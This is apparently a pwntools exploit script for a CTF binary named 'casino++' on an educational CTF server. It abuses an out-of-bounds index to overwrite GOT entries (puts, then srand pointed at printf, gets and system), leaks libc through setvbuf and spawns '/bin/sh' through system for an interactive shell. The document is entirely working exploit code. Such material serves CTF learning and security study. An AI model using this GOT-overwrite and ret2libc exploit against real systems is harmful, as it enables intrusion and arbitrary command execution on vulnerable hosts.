from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

e = ELF('casino++')
libc = ELF('libc.so')


#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10176)
pause()

seed = e.got.setvbuf # 0x602050 = 6299728
age = 30
guess = [87,80,46,13,73,73,52,23,31,94,7,50,51,72,73,93,6,79,4,10,18,25,41,96,36,66,70,98,96,19]


# puts -> casino
success('puts -> casino')

r.sendlineafter('Your name: ', b'a'*16 + seed.to_bytes(4,'little'))
r.sendlineafter('Your age: ', str(age))

for _ in range(6):
    r.sendlineafter(': ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.puts - e.sym.guess) // 4 + 1))
r.sendlineafter(': ', str(e.sym.casino))

for i in range(6):
    r.sendlineafter(': ', str(guess[i]))
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.puts - e.sym.guess) // 4 + 2))
r.sendlineafter(': ', '0')


# srand(seed) -> printf(setvbuf_got)
success('srand -> printf')

for _ in range(6):
    r.sendlineafter(': ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 1))
r.sendlineafter(': ', str(e.sym.printf + 6))

for i in range(6):
    r.sendlineafter(': ', str(guess[i]))
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 2))
r.sendlineafter(': ', '0')


# srand(seed) -> gets(setvbuf_got)
success('srand -> system')
success('leak')

setvbuf_addr = u64(r.recv(6) + b'\0\0')
gets_addr = setvbuf_addr - libc.sym.setvbuf + libc.sym.gets
success('gets addr: ' + hex(gets_addr))

for _ in range(6):
    r.sendlineafter(': ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 1))
r.sendlineafter(': ', str(gets_addr & 0xffffffff))

for i in range(6,12):
    r.sendlineafter(': ', str(guess[i]))
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 2))
r.sendlineafter(': ', str(gets_addr >> 32))


# srand(seed) -> system(setvbuf_got)
success('srand -> system')
success('read /bin/sh')

r.sendline('/bin/sh')

system_addr = setvbuf_addr - libc.sym.setvbuf + libc.sym.system
success('system addr: ' + hex(system_addr))

for _ in range(6):
    r.sendlineafter(': ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 1))
r.sendlineafter(': ', str(system_addr & 0xffffffff))

for i in range(12,18):
    r.sendlineafter(': ', str(guess[i]))
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', str((e.got.srand - e.sym.guess) // 4 + 2))
r.sendlineafter(': ', str(system_addr >> 32))


# pwn
success('pwn')

r.interactive()
